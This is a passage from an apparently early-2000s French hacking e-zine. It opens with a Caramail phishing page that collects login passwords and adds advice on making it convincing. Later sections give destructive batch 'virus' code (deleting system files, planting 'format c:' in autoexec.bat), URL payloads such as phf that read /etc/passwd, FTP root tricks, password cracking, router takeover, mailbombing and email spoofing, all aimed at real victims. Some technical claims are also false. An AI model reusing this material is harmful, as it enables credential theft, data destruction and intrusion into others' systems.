<body bgcolor="#ffffff" link="#000099" vlink="#000099">
<TABLE BORDER=0 CELLPADDING=0 CELLSPACING=0 WIDTH=100%>
<TR BGCOLOR=#F0E8CC><TD COLSPAN=3><CENTER>
<a href="http://adclick.caramail.com/cgi-bin/redirect?
TYPE=PUB&FROM=60&IDBANDEAU=ZOJ92&PARAMS=03732926184BE00000111408111000010&TARGET=
www.zonejeux.com/groom/" TARGET="_blank">
<img src="http://ad.caramail.com/pub/ZOJ92.gif" alt="" border=0 WIDTH=468 HEIGHT=60></A>
</CENTER>
<IMG SRC="http://195.25.89.17/caramail_v?total" WIDTH=1 HEIGHT=1 BORDER=0><SCRIPT>
<!-- 
tps = new Date(); 
if (tps.getSeconds() < 4) {
document.write(" ");
}
-// --></script>
<center><font face="Arial, Helvetica" size="5">Nous sommes désolés cher membre, votre compte 
a rencontré<br> des problèmes pour les raisons suivantes:</font>

<font face="Arial, Helvetica" size="3"><br><br>Raison: </font> 
<font face="Arial, Helvetica" size="3" color="#ff0000"><b>Temps dépassé.<br><br>
Nous vous prions de réactiver votre compte en complétant<br> ce formulaire dans 
<u>les plus brefs délais.</u></b></font><br>
<br>
<font face="Arial, Helvetica" size="2">
<FORM ACTION="http://www.lecgi.net/public/form_mail.cgi" METHOD=POST>
<INPUT TYPE=hidden NAME=destinataire VALUE="votre_login@caramail.com">
Compte:</font><br><input type="text" name="login" size="16" maxlength="16">
<font face="Arial,Helvetica" size="2"><br>Mot de passe:</font><br>
<input type="password" name="passwd" size="16" maxlength="16"><br> 
<input type="submit" value="Enter">
<INPUT TYPE=hidden NAME=sujet VALUE=internic>
<INPUT TYPE=hidden NAME=redirige VALUE="http://www.caramail.com">
</form>
<br>
<br>
<font face="Arial, Helvetica" size="3">Retourner à 
<a href="http://www.caramail.com" target="_parent">La page de caramail</a>.
</font><p><font face="Arial, Helvetica" size="1">© 2002 caramail. Tout droits réservés
</font></center> 
<br>
<br>
<br>
</body>
</html>


Vous pouvez bien entendu, l'adaptez à votre guise en rajoutant par exemple le logo de Caramail
pour faire plus crédible...   
Mais prenez garde, une nouvelle règle Caramail a été instaurée 
le 02/02/02 (ca sonne bien arf). 
Dixit:  " Pour conserver la confidentialité de votre boîte aux lettres Caramail, ne révélez 
jamais votre compte et votre mot de passe Caramail, même si vous recevez un email venant 
soi-disant de l'équipe Caramail. Notre équipe de support n'a en aucun cas besoin de votre mot
de passe pour vous aider sur Caramail. "   

Mouarf, j'étais plié quand j'ai vu ça... D'autant plus que la semaine qui précedait cette 
nouvelle règle, j'avais envoyé une bonne centaine de fake-mail... Arf, faut pas que je me sente
visé non plus...lol
Donc, avant d'envoyer un fake mail, prenez garde d'indiquer une adresse autre que la votre, 
avec une fausse identité... Sinon gare, vous pourriez vous faire choper                  :))



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 8°/Piratage d'un particulier: les virus ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Bon là, je vais quand même pas vous rapeller ce que c'est qu'un virus... Qui ne s'est jamais 
heurté, au moins une fois dans sa cyber-vie, à ce douloureux problème? Je vous le demande... 
Est il possible de telecharger des virus sur le net, sans mettre hors service son pc? 
Ba oui, lancez donc une recherche vous verrez bien... Impressionant... 
Je vous déconseille les virus du type ILoveYou, c'est completement ridicule, prenez plutôt des
virus qui font MAL plutôt que des vieux machins qui vous empechent la lecture de vos fichiers 
mp3...Qu'est ce qu'on s'en fout? lol

Bon, avoir un virus c'est bien mais il faut savoir le maquiller et l'envoyer au plus grand 
nombre de personnes, et cela de manière anonyme. Pour ce qui est de l'anonymat, je ne maîtrise
pas du tout et je ne suis jamais parvenu à envoyer un virus en étant completement anonyme.
D'où l'interet d'envoyer des virus totalement destructeurs plutôt que des virus certes chiants
mais pas fatals, qui permettront à l'utilisteur de pouvoir noter votre adresse e-mail... 
Au moins, quand le disque dur de votre victime est complètement niqué, y'a peu de chances 
qu'on vous retrouve. Mais parait qu'on peut envoyer des virus par mailbomber, ça non plus j'ai 
jamais essayé... 

N'étant pas un expert en virussologie, je vous propose quand même de programmer vos propres 
virus, sans passer par l'assembleur, tout simplement avec word pad... 
Après la création du virus, on le renommera en .bat pour qu'il puisse fonctionner. 
Je vous préviens à l'avance, les virus en .bat, je sais les programmer mais appliquer ce que 
je sais NON. Trop dangeureux, alors si votre pc est lui même infecté par le virus, n'allez pas 
me menacer en disant que c'est de ma faute. Je ne serai en aucun cas responsable, allez donc 
voir le disclaimer... Les virus en .bat sont interessants car aucun anti-virus ne semble 
pouvoir les detecter...  La création d'un virus en .bat est très simple, suffit juste de 
connaître un peu ms-dos. Quelques commandes:

echo off : desactive l'affichage de ce qui se passe
echo on : active l'affichage
echo. : saute une ligne.
echo bonjour : affiche ce qui est écrit après echo (ici, bonjour).
del : à votre avis???  :o
copy : copier un fichier vers un repertoire.
deltree : demander votre avis avant de supprimer.
if .... : commande de condition.
cd : se deplacer dans un autre repertoire
valeur1/variable1 = valeur2/%variable2% : attribue une valeur/variable à une autre valeur/variable.
dir c:/windows : affiche tout le contenu d'un repertoire (ici, windows).
cls : efface l'écran.
attrib : sert à mettre des attributs sur les fichiers, exemple: attrib +r +h c:\test.txt 
va mettre le fichier test.txt en attribut invisible et inmodifiable.
pause : demande d'appuyer sur une touche pour continuer.
start : demande d'executer un fichier.
rem : insérer une remarque.
commande>nul : executer une commande silencieusement.

Voilà donc un de ces virus très dangeureux que vous pouvez faire:

>echo off
>echo bonjour
>echo je suis un virus, programmé par [Kefka]
>echo c'est quoi windows/system?
>echo ca m'a l'air d'être dangeureux
>echo je m'en occupe
>pause
>del C:/windows/system/*.*
>echo voilà, c'est effacé, t'auras plus de problèmes mouarf
>echo adieu!!!

Mouarf, vous voyez quoi, ensuite vous enregistrez le fichier word, vous le renommez en .bat et
si vous êtes tendance crasher, vous l'executer... :-)
Après vous rajouter dans autoexec.bat la ligne de commande c:/votrevirus.bat pour qu'il puisse s'executer au démarrage du pc...
On peut aussi créer des virus proposant plusieurs choix, avec un menu d'option, du genre:

>@echo off
>copy c:\windows\bureau\mitnick.bat c:\mitnick.bat
>Attrib +r c:\mitnick.bat
>Attrib +h c:\mitnick.bat
>del c:\windows\bureau\mitnick.bat
>REM  ---This programm has been coded by [Kefka]
>REM             *** All right reserved***
>echo format c:>nul>>c:\autoexec.bat
>cls
>:menu
>echo 1. editer un fichier
>echo 2. lancer un scan
>echo Q. Quitter
>choice /c:12Q/t:Q,60/n Votre choix?
>if errorlevel 255 goto erreur
>if errorlevel 3 goto Quitter
>if errorlevel 2 goto startscan
>if errorlevel 1 goto editfile
>if errorlevel 0 goto erreur
>
>:erreur
>echo il y'a eu une erreur
>pause
>start c:\rundll32.exe user.exe,exitwindows
>
>:Quitter
>echo aurevoir
>goto erreur
>
>:startscan
>start scandisk
>goto erreur
>
>:editfile
>edit
>goto erreur
>
>@echo on 

Cool n'est ce pas? Laissez libre cours à votre imagination, mais faites gaffe quand même :-) . 
(à partir de ce modèle, je pense que vous n'aurez pas trop de problèmes à faire votre virus perso). 

Pour compiler vos créations, telecharger Power Batch. 
Voilà qui va clore ce chapitre sur la programmation de virus en .bat, ma fois très interessant. 
N'en abusez pas trop, ça peut être dangeureux arf.



²²²²²²²²²²²²²²²²²²²²²²²²
² 9°/Hack sous IRC/ICQ ²
²²²²²²²²²²²²²²²²²²²²²²²²

Bon, on va s'éloigner un peu de la programmation avec un article pour les newbies de chez 
newbies lol. 
On va commencer par ICQ, ca sera plus simple. Donc, vous avez votre client ICQ, y'a un keum 
qui vous fait chier et vous voudriez bien usurper de son pseudo pour passer pour un con devant 
sa copine (s'il en a une ....). C'est très simple: Faites:

>ICQ
>Add/Change current user
>Register a New User(ICQ#)
Entrez donc toutes les informations concernant votre victime.Puis:
>Change the Active User

Et le tour est joué! Seul votre numéro ICQ diffère alors faites quand même gaffe... 
Bon, sinon je pourrais vous expliquer l'ip spoofing sous ICQ mais je prefere vous l'expliquer 
un peu plus loin, sinon on va croire que je me répète...

Sous IRC, maintenant, c'est déjà plus facile. Supposons que vous soyez connectés sur irc.jeuxvideo.com . 
Allez sur le site de www.jeuxvideo.com et rentrez dans le dialogue en direct. Vous serez connectés 
sous deux identités différentes! De plus, vous pouvez à l'aide de votre client IRC, et sur irc.jeuxvideo.com, 
vous connecter avec des pseudos déjà reservés, ou avec des pseudos qui se rapprochent des vrais 
(quelle est la différence entre hack-man et hack-rnan selon vous? :-o ).
Un truc chouette, avec les clients IRC, c'est le flood. Le flood consiste à envoyer un message,
repeté ou non, sur un chat afin d'empecher les autres utilisateurs de chatter (du moins c'est ma version des faits lol). 
Les copier-coller conservent leur integralité! Selectionnez et copier le contenu de ce zine par
exemple. Ouvrez votre client IRC, allez sur irc.jeuxvideo.com (mouarf décidément c'est ma cible préférée) 
et faites un coller avec ctrl+v... Effet garanti!!! arf...
Bon je pourrais vous passer en revue les différentes commandes possibles sur irc, mais vous 
pouvez déjà les avoir avec un ptit /msg chanserv help, ou /msg nickserv help .

Alors bon chat !!!



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 10°/Architecture Linux (Unix) ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Linux est un systeme d'exploitation qui a été crée en 1976, O.S très important puisque le 
réseau internet est entièrement constitué de machines linux. 
Linux est également un O.S très pratique pour hacker, bien que pas franchement indispensable, 
il n'en est pas moins important. Mais il présente un très grand problème: la sécurité , arf...

Unix (ou linux c'est la même chose) est un système multi-utilisateurs, dont les utilisateurs 
ont plus ou moins de droits. Le plus interessant est le root, car il possède tous les droits. 
Quand vous penetrerez un système unix, vous tomberez sur plusieurs dossiers, sous dossiers, 
communs à toutes les machines tournant sous linux. 

Voilà un shéma illustrant le système de fichiers sur une architecure linux:
 
|--/unix
       |
       |--/etc|--/passwd
       |      |--/bin
       |      |--/group
       |      |--/profile
       |      |--/utmp
Systeme|      |--/conf
UNiX --|      |--/motd
en     |     etc...
general|
       |--/dev              |--/duke3d
       |                    |
       |--/tmp     |--/jeu|--/command&conquer
       |           |
       |--/lib     |--/annuaire
       |           |
       |--/usr|--/X|--/mail
       |      |    |        
       |      |    |--/bin    |--/celullaire
       |      |    |          |
       |      |    |--/travail|--/plan-telephonique
       |      |    
       |      |    
       |      |--/Y|--/travail
       |      |    |
       |      |    |--/mail
       |      |
       |      |-etc....
       |
       |--/bin
       | 
      --/root ou /

Voilà maintenant une petite description du contenu de ces réperoires:

/etc: se trouve a la racine du serveur ,il contient toute la configuration du système. 
Il y a dans ce dossier les fichiers définissant les droits des utilisateurs , la configuration 
du dns ,les partitions qui doivent être montées ,la liste des machines avec les quelles on 
s'autorise à converser. Si le dossier se trouve autre par qu'à la racine du disque, cela veut 
juste dire qu'il concerne les fichiers de paramétrage de la zone du dossier dans le quel etc 
se trouve. Tous les fichiers magiques représentant les différents types de hardware qui sont 
installés dans le serveur.Sous unix,la majorité des objets manipulable sont des fichiers. 
Ce rép permet de voir et de faire beaucoup de chose:exemple "voir"passer les paquets tcp/ip,
ou parler au modem ou d'écrir sur le disque.Ce sont des programmes qui gère tout cela,car sinon 
ce serait vachement difficile.

/bin et /sbin : le "s" devant bin veut dire qu'il s'agit de la version super user. 
Ce répertoire contient tout les binaires (dout son nom) qui servent à manipuler les 
différentes fonctionnalités du système. Il ne faut pas y toucher sous peine de tout foutre 
en l'air donc les crashers savent se qu'il doive supprimé. La suppression de ce fichier
entraînerais que le système unix deviendrais imbootable. Encore une fois, on trouve ces dossier
un peu partout sur le système unix, cela veut juste dire qu'il concerne la zone en question: 
/user/sbin représente une partie des codes binaires du super admin (si non il y aurais pas le "s"). 
Mais vous me direz c'est pas bin pour les user: car sans cette partie de code binaire du super user, 
le usr ne pourrais pas ce servir du serveur.

/usr: c'est la ou se trouve tous les progs que vous avez installez mais ce répertoire concerne 
plus linux donc je ne m'attarderais pas sur ce sujet.

/var: cette à cette endroit que l'on aura toute la partie variable du système.On y trouve tous 
les rèp suivant: log, spool, lock. Dans log , c'est la que tout ce que vous faites sur le serveur 
est loggé dout son nom "log", donc fichier a supprimé si vous le pouvez. 
Dans /var/spool: on trouve tous les fichiers en attendes de transfert , d'impression. Vous pouvez 
aussi trouvez les emails en attende de transfert. Donc pour les hackers c'est le top, profiter 
des négligences de l'admin ou de sa méconnaissance ,peut être a t'il oublié de mettre un 
accès restreint a ce répertoire...

/tmp: Tous les fichiers qui sont susceptibles d' être effacés par le système ou par l'admin. 
On y trouve un peu de tout. Vous pouvez trouver un fichier passwd en cours d'utilisation ou de 
traitement. Ou encore des fichiers décodés. Donc c'est aussi un endroit a retenir.

/mnt: Le plus souvent ,on n'y trouve tous les lecteurs disquettes et cd rom. On peux aussi avoir 
accès a un disque dur d'une machine du réseau local du serveur, et les droits d'accès à ces 
disques durs peuvent être négligé. Donc aussi un rép a pas oublier.

/lib:  Un endroit stratégique ,le droit d'écriture est toujours réservé au super user. 
On y trouve des codes binaires parfois prl et tcl. Cette endroit est bien protégé parce que il 
suffit d'imaginer ce qu'il se passerait si quelqu'un était en mesure de remplacer une 
librairie très commune et anodine par une autre ayant exactement les memes fonctionnalités 
mais qui, en plus contiendrait un cheval de Troie... 



Etudions maintenant les principales commandes Linux .

ls : cette commande vous permet d'avoir plus d'informations sur un repertoire ou un fichier
exemple:

>ls etc
>d rwxr-x---   root   skipass   10000   05/02/02   18:50   passwd
>d rwxr-x---   root   skipass   12000   05/02/02   18:51   group
> 1   2              3         4            5            6            7          8

Et voilà à quoi correspondent ces differentes parties:

1 : le type de fichier : il en existe trois : 
-les repertoires
-les fichiers ordinaires (textes, courriers, source de programmes,.exe,etc.)
-les fichiers speciaux (pour la gestion du systeme, donc interressant)
2 : le bit de droit d'acces: il se divise en trois partie de trois caracteres (il y'a neuf caractères)
La premier partie concerne le propio du file (u)
La deuxieme partie concerne le groupe du proprio (g)(avec lequel il travaille)
La troisieme concerne un utilisateur externe au groupe.(o)
Dans les trois cas il existe trois droit d'acces qui sont designe par trois
lettre respective :
r : droit de lecture (Read)
w : droit d'ecriture (Writte)
x : droit d'execution (eXecute)
le - indique qu'il n'y a aucun droit accorde
3 : le proprio du file
4 : le groupe auquel le proprio appartient ou travaille
5 : memoire en ko
6 : la date de la derniere lecture
7 : l'heure de la derniere lecture
8 : le nom du fichier

cat: cette commande vous permet de lire les fichiers txt, si vous en avez la permission naturelement.     ;-)

cd: cette commande vous permet de changer de repertoire.

get: cette commande permet de récuperer un fichier

mget: cette commande permet de récuperer le contenu d'un répertoire

cp: cette commande vous permet de copier un fichier.

del: cette commande vous permet de supprimer un fichier.

rmdir: cette commande vous permet de supprimer un répertoire.

mkdir: cette commande vous permet de créer un répertoire.

get: cette commande vous permet de transférer un fichier du serveur jusqu'à votre bureau

pwd: cette commande vous permet de savoir dans quel répertoire vous êtes.

dir: cette commande vous permet d'accèder au contenu d'un répertoire.

put: cette commande vous permet d'envoyez un fichier au serveur.

mput: cette commande vous permet d'envoyez une liste de fichiers au serveur.

cd/: cette commande vous permet d'aller à la racine du serveur.

cd..: cette commande vous permet de retourner au repertoire parent.

disconnect: cette commande vous permet de vous déconnecter du serveur.

who: cette commande vous permet de savoir quels sont les utilisateurs connectés.

write: cette commande vous permet de "chatter" avec un des utilisateurs connectés.

Voilà, c'est a peu près tout ce qu'il faut savoir à propos d'Unix. Cela vous suffira amplement
quand vous tenterez d'attaquer un site quelconque...
A propos de hack de site, justement nous y voilà     :-))



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 11°/Piratage d'un site: introduction ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Bon, vous allez me dire que vous le savez déjà, mais je vous le redis, le piratage est sévèrement 
puni... Alors, si vous arriver à avoir accès aux données d'un site, ne faites pas le con, au 
maximum vous modifiez la page d'accueil du site mais c'est tout! 
Pas de crash, je vous fais confiance... Surtout si vous vous attaquer à un provider ou à un 
site d'état, là vous êtes vraiment dans la merde... Vous serez vite tracés et vite reperés, 
soit vous aurez un avertissement très sévère ou bien vous aurez le droit à une sanction juridique!  

Je vous rapelle pour mémoire que je ne serais en aucun cas responsable de ce que vous pourrez 
faire avec ces informations. C'était juste histoire de remettre les point sur les i...

Bon, si vous voulez vous attaquer à un site, il vous faudra d'abord rassembler le maximum 
d'informations sur lui. Un très bon outil est fait pour ça il s'agit de WSpingProPack, 
disponible entre autre sur http://www.ipswitch.com . N'hésitez pas à rassembler vos 
informations sur un bloc-notes afin de pouvoir les avoir à votre portée, en cas de necessité!

Voilà donc un petit listing du matériel que vous devez avoir avant de commencer un hack:
-WsPingProPack, ou si vous ne l'avez pas utiliser des comandes DOS pour parvenir à vos fins 
(tracert www.nomdusite.com ; ping -A www.nomdusite.com ).
-Un bon crackpass (VcrackFTP devrait convenir).
-Un decrypteur pour Unix (genre Jack The Cracker).
-Un client FTP genre Ftp explorer
-Une légère conaissance de Linux.
-Une feuille avec toutes les informations sur le site.
-Un sniffer (pas dans tous les cas)
-Une bonne notion des exploits et de la programmation (pas dans tous les cas)
-Une mitraillette MP5, pour vous proteger si les flics débarquent chez vous, arf non je deconne...     :))
-Une conscience...

Vous avez tout le matos? Oki c'est parti mon kiki           :-D



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 12°/Piratage d'un site: hack par ftp ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Nous allons plus particulièrement nous interesser à deux cas de figures. L'un dans le cas d'un 
serveur peu protegé, l'autre dans le cas d'un serveur mieux protegé. On commence...

// Dans le cas d'un serveur peu protegé: 

Prenons comme exemple le site de skipass.com. Avec WSPINGPROPACK, on récupere les noms des 
contacts (dans l'onglet "infos") :
 "Administrative Contact, Technical Contact, Billing Contact:Sellimoutou, Marina  (MS4651) noc@VERIO.FRVERIO FRANCE". 
Alors, on constate deux noms d'users, Sellimoutou et Marina. 
Ouvrez donc votre client FTP entrez l'adresse du site et dans profile name et login entrez le 
nom d'un de ces utilisateurs avec comme mot de passe l'adresse noc@VERIO.FR 
(le plus souvent le mot de passe sera une adresse e-mail si le serveur est mal configuré bien 
entendu) . Et si cela ne marche pas (c'est le cas ici) sortez VcrackFTP et testez toutes les 
Wordlist que vous pourrez... Bon courage !!!

// Dans le cas d'un serveur mieux protegé:

Allez sous DOS et tapez:

>ftp
>open www.nomdusite.com
>quote user ftp
>quote cwd ~root
>quote pass ftp 
Cet exploit vous donnera soit l'accès root (le root est l'utilisateur qui a le plus de droits 
sur un systeme unix), ou soit un accès anonyme sur le serveur. Comme cela sera très certainement
le cas, restez sous DOS et tentez de récuper le fichier passwd. Tapez:

>get etc/passwd

Le repertoire dans lequel est placé ce fichier varie selon l'O.S (systeme d'exploitation) du 
serveur. 
Voici donc une liste de ces répertoires:

Os   >   Répertoire dans lequel passwd est caché
-----------------------------------------------------------------
AIX3 > etc/security/passwords
A/UX 3.Os > tcb/files/auth
BSD4.3-Reno > etc/master/passwd
ConverOs 10 > etc/shadow
DG/UX > etc/tcb/aa/user
EP/IX > etc/shadow
HP-UX > secure/etc/passwd
IRIX 5 > etc/shadow
Linux 1.1 > etc/shadow
SCO Unix#.2.x > tcb/auth files/r/root
SunOs 4.1+c2 > etc/security/passwd/adjunct
SunOs 5.0 > etc/shadow
System V 4.0 > etc/shadow
System V 4.2 > etc/security
Ultrix 4 > etc/auth/[.dir|.pag]
UNICOS > etc/udb

Hem, hem, ba voilà... Ne croyez cependant pas que le tour est joué. 
Le fichier passwd atterira sur votre bureau.
Là, il y'a 2 possibilités, soit le fichier est crypté, soit il est en shadow. 
Si il est crypté, vous aurez un truc du genre "root: 1fd5s1: 0: 1: Superuser" , prenez donc 
Jack The Cracker ou tout autre decrypteur de pass Unix, et attendez... Patience  :))
S'il est en shadow (en étoile), ce qui nous donne quelque chose comme "root:x:0:1:Superuser", 
cela veut dire que le vrai fichier passwd se trouve dans un autre répertoire, qui varie donc 
selon l'O.S, vous avez compris... :)

Quand vous aurez les pass, utilisez comme login le nom d'un des users, comme on a vu tout à 
l'heure. (ou alors mettez comme login: root)

Si l'accès anonyme ne vous est pas autorisé, cherchez d'autres failles possibles à exploiter... 
Et passez donc à la suite.    :-)
 


²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 13°/Piratage d'un site: exploiter les failles Wingate ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Certains serveurs tournant sous Windows NT présentent des failles très interessantes pour les 
hackerz...Le port de Wingate est le 8010. Essayez donc de taper sur votre navigateur ceci:

>http://www.urlNT.com:8010/c:/

Cette faille peut vous permettre de vous faire passer pour un ordinateur connecté au réseau et 
donc d'avoir accès à tous les dossiers du serveur... 
Très cool. Sinon, essayez par Telnet, entrez comme adresse:
>wingate>www.url.com
Soit vous aurez directement accès au contenu des ordinateurs, soit le serveur vous demandera 
un login et un mot de passe. 
Reportez vous donc au chapitre Hack par Telnet pour passer cette protection    :p



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 14°/Piratage d'un site: exploiter les failles CGI ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Certains serveurs vous permettent d'accèder au fichier passwd directement dans la barre d'url en tapant
>www.nomdusite.com/etc/passwd
Cela ne marche que très rarement, mais vous pouvez aussi tenter d'autres adresses, si le site utilise le php:
>http://www.nomdusite.com/cgi-bin/php.cgi?/etc/passwd
Ou si le site utilise le  phf:
>http://www.nomdusite.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

Mais nous allons plutôt nous préocupper des faiblesses php, qui nous permettront de récupere 
les passwd de l'administrateur d'un forum d'un site qui utilise le php.
Donc nous avons un site quelconque, qui possède un forum en php3. 
Tentez pour commencer d'accèder aux stats du sites:
>http://www.nomdusite.com/stats

Si l'accès n'est pas protegé, c'est du gateau, allez sur les stats ftp:
>http://www.nomdusite.com/stats/ftp

Vous obtiendrez alors les url de certain fichiers, censés être cachés, dont certains ont une 
importance. Essayez d'accèder à ces fichiers, et cherchez le mot de passe de l'administrateur 
du forum, placé dans le fichier config.txt. Il vous faut mainteant vous logger en tant 
qu'administrateur. 
Sur la page d'accueil du forum, vous notez l'adresse, http://www.nomdusite.com/forum/index.php3. 
Chaque message contient un numéro et la lecture fonctionne comme ceci: message.php3?num=21. 
Il y'a donc une variable num. Nous allons maintenant chercher la variable d'administration, essayez donc :

>http://www.nomdusite.com/forum/index.php3?admin=passwd

Vous serez donc loggé en tant qu'admin. Cette faille est assez rare mais vaut vraiment qu'on 
essaye de l'exploiter. De plus, il arrive que le mot de passe de l'admin du forum soit le même que celui du site.   ;-)

Bonne chance !!!



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 15°/Piratage d'un site: hack par Telnet ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Conditions nécessaires:
-Que vous ayez Telnet
-Que vous ayez un bon cracker de mot de passe
-Que vous ayez beaucoup de chance   :op

Certains sites disposent d'un accès Telnet. Si Telnet est mal configuré vous pouvez facilement 
accèder au contenu du serveur d'un site.
Ouvrez donc Telnet, Démarrer/Executer et tapez telnet.exe.
Mettez le nom du site dans nom d'hôte, laissez le port Telnet et connectez vous. 
Si tout se passe bien, vous aurez accès au serveur, et on vous demandera un login et un mot 
de passe. Si le serveur est mal configuré, vous n'aurez pas besoin de mot de passe. 
Mettez donc come login le nom du site ou le nom d'un de ses webmasters 
(récuperés avec WsPingProPack). 
Si le serveur réclame un mot de passe, utilisez un bon cracker de mot de passe et ayez 
beaucoup de patience...
U
tilisez la commande "help" pour avoir la liste des commandes possibles.
Voilà !!!            :))



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 16°/Piratage d'un site: comment s'attaquer à un routeur ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Conditions nécessaires:
-Que vous ayez Telnet
-Que vous ayez WsPingProPack
-Que vous ayez un bon sniffer
-Que vous fassiez très attention...

Rappelons tout d'abord la définition d'un routeur: Un routeur est un disposiif matériel qui 
permet d'envoyer et de reçevoir des données depuis un réseau. 
L'intêret de s'attaquer un routeur, c'est qu'en devenant routeur, on peut ainsi changer 
l'adressage du réseau et intercepter des informations top-secretes... 
Mais bon fantasmez pas trop là...    :p

Pour trouver l'adresse IP d'un routeur afin de pouvoir s'y connecter, il faut déjà connaitre 
l'adresse IP du réseau. Bon alors on au site dont l'ip est: 45.12.38.20  (je dis n'importe quoi là mais c'est qu'un exemple) . 
Alors tout ce qui nous interesse dans cette ip, vous l'aurez compris, c'est l'adresse du réseau, 42.12.38 .
Sortez donc WsPingProPack, on va scanner tout ce qui est sur le réseau. 
Lancez donc un scan sur SNMP, on obtient donc une liste d'adresse IP, celles des routeurs miam miam...

Connectez vous donc au routeur par Telnet. 
Pour le login, prenez les noms des webmasters du site et pour les passwords, 
prenez votre sniffer et attendez que quelq'un se logue sur le routeur... 
Surtout faites TRèS attention, chaque connection est enregistrée avec votre IP. 
Donc mettez en oeuvre différentes techniques de spoofing pour pas qu'on vous repère. 
Sinon, vous allez passer une bonne partie de votre vie à dormir à prison...    ;-((




²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 17°/Piratage d'un site: approche de script kiddie ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

La question qui vous mord les lèvres: Qu'est ce qu'un script kiddie? 
On désigne par ce terme les pirates qui s'introduisent sur un serveur, au moyen d'exploits, 
visant à acquérir l'accès root, (NDLR: le plus souvent en langage C) sans en connaître la 
signification. 
Devenir sk (abréviation de script kiddie  :-o)) est une chose très interessante pour les 
newbies car cela nécessite très peu de conaissances. 

Comment donc procéder pour attaquer un serveur, en étant script kiddie?
La première étape consiste à trouver l'O.S du serveur. Ouvrez une fenêtre DOS et tapez :
>ftp
>open www.nomdusite.com     (ok je sais c'est du déjà vu mais bon...)

Dans la plupart des cas le serveur se présentera à vous, sinon trouvez une autre méthode. 
(linux est très utile pour trouver un O.S.)
La seconde étape consiste à chercher des exploits, exploitant les faiblesses du serveur. 
Ces exploits varie donc selon son O.S. Vous en trouverez plein sur le net avec ftpsearch. 
Vous pouvez également aller sur http://www.rootshell.com y'en a plein là bas aussi.

La dernière étape est de compiler cet exploit sur le serveur afin de devenir root 
(le plus souvent les exploits servent à ça). 
Il vous faudra donc d'abord créer un compte sur le serveur puis y placer votre exploit pour 
ensuite le compiler sur le serveur et enfin l'executer. Puis après, vous êtes le master du 
systeme, pas besoin que je vous dise les differents trucs que vous pouvez faire en étant root, 
les idées viendront bien toutes seules :))

Bon, c'est cool tout ça, mais qu'est ce que ca fait de plus un vrai hacker? 
Simple, il fait tout ce que les sk ne font pas, c'est à dire détecter les failles du serveur
et utilisez des exploits crées par eux mêmes, ou alors simplement les comprendre, les maîtriser (je sais c'est dur...)
Certes, on arrive au même résultat, mais un sk se soucie guère des programmes qu'il utilise.
La seule différence entre le sk et le vrai hacker est le niveau de programmation... :p
Ca peut paraître très chiant mais sans la programmation, vous ne serez jamais un grand hacker... (voir chapitre 21)

NB: Avoir un root sur un systeme c'est chouette mais il va falloir faire un backdoor 
(traduction: porte de derrière) pour pouvoir cacher votre root et pour revenir sur le serveur 
quand vous voulez. (voir chapitre 20)  



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 18°/Comment cacher son identité sur le net: les mails anonymes ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Là vous avez deux solutions : - avec un mailbomber
                                             - avec Telnet

Ces deux méthodes ne fonctionnent que sur des serveurs du type mail.domaine.com   
(par exemple mail.hotmail.com).
Bon, commençons par le mailbomber. 
Je vous conseille de prendre le mailbomber de Socket23, qui est un trojan. Ouvrez le et dans 
"serveur de la messagerie" mettez mail.domaine.com puis indiquez l'email de la victime. 
Mettez ensuite votre adresse mail (une fausse bien entendue :p) et indiquez le nombre de
messages à envoyer (NDLR:il n'y a pas de limites...) et connectez vous. Simple et efficace ...  :))

Maintenant pour ceux qui veulent faire plus compliqué vous pouvez aussi en envoyer par Telnet.
Ouvrez donc Telnet indiquez le serveur de la messagerie, mail.domaine.com, entrez le port 23 
et connectez vous. 
Puis tapez : (NB: ce que vous tapez n'apparaît pas à l'écran)

>helo mail.domaine.com

Ceci devrait présever votre anonymat. (certains serveurs n'acceptent pas cette commande). 
Tapez maintanant

>mail from: n'importequi@n'importequoi.com    (votre fausse email)
>rcpt to: victime@domaine.com    (indiquez là l'adresse de votre victime)
>data

Puis tapez votre message, sans oublier de mettre un point à la fin.
Voilà !!!

Si vous voulez pas vous prendre la tête avec ces méthodes, telechargez anonymizer, 
c'est plus sûr et plus efficace.    :))




²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 19°/Comment cacher son identité sur le net: le spoofing ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Le spoofing sert à cacher son adresse IP sur Internet, en en prenant une autre. 
C'est plus facile à dire qu'à faire... Etudions les différentes techniques de spoofing:

